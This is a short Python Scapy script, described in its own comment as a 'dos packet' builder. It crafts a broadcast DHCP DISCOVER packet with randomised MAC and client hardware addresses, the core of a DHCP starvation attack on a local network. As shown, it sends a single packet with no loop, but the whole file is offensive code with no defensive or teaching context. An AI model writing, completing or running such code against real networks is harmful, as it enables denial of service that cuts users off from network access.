from scapy.all import *
from time import sleep
import ipaddress

conf.checkIPaddr = False

#crate fields for dos packet
ether = Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff")
ip = IP(src="0.0.0.0", dst="255.255.255.255")
udp = UDP(sport=68, dport=67)
# op=1 means that its a boot request.
bootp = BOOTP(op=1, chaddr=RandMAC())
dhcp = DHCP(options=[("message-type", "discover"), ("end")])

packet = ether/ip/udp/bootp/dhcp

sendp(packet, verbose=1)